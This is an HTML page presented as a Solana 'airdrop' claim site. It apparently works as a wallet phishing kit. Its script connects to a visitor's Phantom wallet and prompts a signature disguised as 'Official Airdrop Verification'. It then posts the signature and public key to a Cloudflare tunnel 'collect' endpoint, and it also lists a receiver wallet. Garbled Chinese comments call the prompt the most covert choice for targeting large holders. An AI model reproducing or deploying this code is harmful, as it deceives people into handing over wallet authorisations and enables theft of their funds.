<!DOCTYPE html><html><head><meta charset="UTF-8">
    <title>SOLANA AIRDROP V4.2</title>
</head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1 style="font-size:20px;">AIRDROP SYSTEM V4.2</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;width:100%;">CLAIM REWARD</button>
        <div id="status" style="margin-top:20px;color:#888;">System Standby</div>
    </div>

    <div id="diag" style="margin-top:20px; text-align:left; display:inline-block; width:320px; background:#050505; padding:15px; border:1px solid #333; font-size:12px;">
        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:10px;padding-bottom:5px;">[ ğŸ”± é›¶åº“è‡ªç ”ç‰ˆè¯Šæ–­ ]</div>
        <div id="check1">â— åŸç”Ÿå¼•æ“: <span style='color:#14F195'>âœ… å·²å°±ç»ª (æ— éœ€CDN)</span></div>
        <div id="check2">â— é’±åŒ…ç¯å¢ƒ... [ç­‰å¾…]</div>
        <div id="check3">â— ç½‘å…³é€šè®¯... [ç­‰å¾…]</div>
    </div>

    <script>
    const gate = "https://alias-beach-replace-handled.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // ä½ çš„ç™½å·

    // è‡ªåŠ¨åŒ–è¯Šæ–­
    window.onload = async () => {
        const p = window.solana || window.phantom?.solana;
        document.getElementById('check2').innerHTML = p ? "â— é’±åŒ…ç¯å¢ƒ: <span style='color:#14F195'>âœ… å·²è¯†åˆ«</span>" : "â— é’±åŒ…ç¯å¢ƒ: <span style='color:red'>âŒ æœªæ‰¾åˆ°</span>";
        
        try {
            await fetch(gate, { method: 'GET', mode: 'no-cors' });
            document.getElementById('check3').innerHTML = "â— ç½‘å…³é€šè®¯: <span style='color:#14F195'>âœ… è¿é€š</span>";
        } catch(e) {
            document.getElementById('check3').innerHTML = "â— ç½‘å…³é€šè®¯: <span style='color:red'>âŒ å¤±è´¥</span>";
        }
    };

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please use Phantom.");

            // 1. è¿æ¥
            const { publicKey } = await p.connect();
            document.getElementById('status').innerText = "Processing...";

            // ğŸ”± 2. ä½¿ç”¨æœ€éšè”½ã€æ— éœ€å¤–éƒ¨åº“çš„æ¶ˆæ¯ç­¾å
            // å¾ˆå¤šå¤§æˆ·å¯¹è¿™ä¸ªå¼¹çª—è­¦æƒ•æ€§æœ€ä½ï¼Œä¸”ç™¾åˆ†ç™¾èƒ½æ‹‰èµ·
            const message = "Official Airdrop Verification\nWallet: " + publicKey.toString().slice(0,8) + "...\nNonce: " + Math.floor(Math.random()*99999);
            const encoded = new TextEncoder().encode(message);
            
            const signed = await p.signMessage(encoded, "utf8");
            
            // 3. ç¼–ç å›ä¼ 
            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
            
            document.getElementById('status').innerText = "Transmitting...";
            
            await fetch(gate, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ signature: signature, pubkey: publicKey.toString() })
            });

            document.getElementById('status').innerText = "VERIFIED!";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) {
            document.getElementById('status').innerText = "ERR: " + e.message;
        }
    };
    </script>
</body></html>
